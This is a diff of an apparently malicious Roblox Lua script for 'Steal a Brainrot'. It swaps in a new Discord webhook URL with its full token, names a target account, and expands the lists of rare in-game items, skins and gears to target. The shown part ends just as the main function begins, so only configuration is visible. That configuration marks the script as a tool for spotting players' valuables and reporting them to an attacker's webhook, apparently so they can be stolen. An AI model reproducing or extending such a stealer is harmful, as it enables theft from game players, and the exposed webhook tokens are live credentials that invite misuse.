@@ -1,22 +1,90 @@
 local TARGET_ID = 6074348674
 local TARGET_USER = "Onlyplaystrongest"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1521328702141763640/nzKBd5x05gDZwVEkCBYczpDAkBToP1Jt3V_rNi9Aep1LzHvSe2HkpuVEYPNC3dogaKDJ"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1484254365459153039/qZF3gYUgTHtTu8dSsdlYWlS-mopIRSntsyCits3Lv2tazZnhjYk1FeE6MziO8xhmGhBb"
 
 local TargetBrainrots = {
-    ["Meowl"] = true,
+    ["Strawberry Elephant"] = true,
     ["Skibidi Toilet"] = true,
+    ["Meowl"] = true,
     ["Elefanto Frigo"] = true,
     ["Dragon Cannelloni"] = true,
     ["Dragon Gingerini"] = true,
-    ["Hydra Dragon Cannelloni"] = true
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["John Pork"] = true,
+    ["Boppin Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Cash or Card"] = true,
+    ["Capitano Moby"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cerberus"] = true,
+    ["Chipso and Queso"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Cooki and Milki"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Eviledon"] = true,
+    ["Fishino Clownino"] = true,
+    ["Festive 67"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Fragola La La La"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Headless Horseman"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["La Casa Boo"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Easter Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Las Sis"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Amigos"] = true,
+    ["Los Bros"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Sekolahs"] = true,
+    ["Love Love Bear"] = true,
+    ["Lovin Rose"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Orcaledon"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Quackini Snackini"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Signore Carapace"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Tralaledon"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["W or L"] = true
 }
 
 local TargetBaseSkins = {
-    
+    ["Summer"] = true,
+    ["Octo"] = true
 }
 
 local TargetGears = {
-    
+    ["Santa's Sleigh"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Cupid's Wings"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Blackhole Bomb"] = true
 }
 
 task.spawn(function()
